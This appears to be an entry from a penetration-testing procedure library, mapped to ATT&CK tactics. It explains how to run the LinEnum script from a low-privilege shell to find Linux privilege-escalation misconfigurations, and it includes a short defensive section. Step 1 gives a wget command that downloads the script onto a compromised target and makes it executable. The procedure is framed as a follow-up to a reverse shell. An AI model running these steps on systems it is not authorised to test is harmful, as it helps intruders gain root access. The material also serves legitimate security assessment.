---
id: 38adc8a2-8350-4e66-9bdf-b3aca59ece32
name: enumerate-linux-privilege-escalation-paths-with-linenum
type: procedure
verified: true
submitted: true
created_at: '2019-10-25T23:13:00.366945+00:00'
updated_at: '2023-05-25T20:11:43.504159+00:00'
tactics:
  - '[[tactics/Discovery|TA0007]]'
  - '[[tactics/Privilege Escalation|TA0004]]'
techniques:
  - '[[techniques/System Information Discovery|T1082]]'
  - '[[techniques/File and Directory Discovery|T1083]]'
  - '[[techniques/Account Discovery|T1087]]'
  - '[[techniques/Permission Groups Discovery|T1069]]'
  - '[[techniques/System Service Discovery|T1007]]'
sub_techniques: []
tags:
  - linux
  - privilege-escalation
  - enumeration
  - misconfiguration
commands:
  - '[[commands/linenum-basic-scan-for-vulnerabilities]]'
  - '[[commands/linenum-thorough-filesystem-scan]]'
platforms:
  - Linux
  - BSD
tools:
  - '[[tools/LinEnum]]'
validated: true
---

# enumerate-linux-privilege-escalation-paths-with-linenum

## Summary

This procedure uses LinEnum to automatically scan a Linux system for privilege escalation vectors like SUID binaries, writable files, and misconfigs from a low-priv shell.

## Description

LinEnum is a bash script that checks kernel exploits, cron jobs, sudo perms, and more. Run basic for quick checks or thorough (-t 1) for deep filesystem scans. Ideal post-reverse shell to find paths like writable /etc/passwd.

## Requirements

- Shell access on target (e.g., www-data)
- wget/curl to transfer LinEnum.sh
- Execute permissions on target

## Defense

- Regularly audit SUID/GUID files (find / -perm -4000)
- Use minimal privileges for services
- Patch kernel and monitor cron/sudoers changes

## Objectives

- Identify priv-esc misconfigs
- Locate writable sensitive files
- Gather system info for targeted exploits

## Instructions

### Step 1: Transfer LinEnum to Target

**Context**: Download from GitHub via shell.

In shell: wget https://github.com/rebootuser/LinEnum/raw/master/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh

### Step 2: Run Basic Enumeration

**Context**: Quick scan for obvious issues.

**Command** ([[commands/linenum-basic-scan-for-vulnerabilities]]):
```bash
./LinEnum.sh
```

> Outputs sections like user info, SUID, without deep tests.

### Step 3: Run Thorough Scan

**Context**: Enable file timing checks (-t 1) for comprehensive coverage.

**Command** ([[commands/linenum-thorough-filesystem-scan]]):
```bash
./LinEnum.sh -t 1
```

> Detailed report; look for 'Writable: /etc/passwd'.
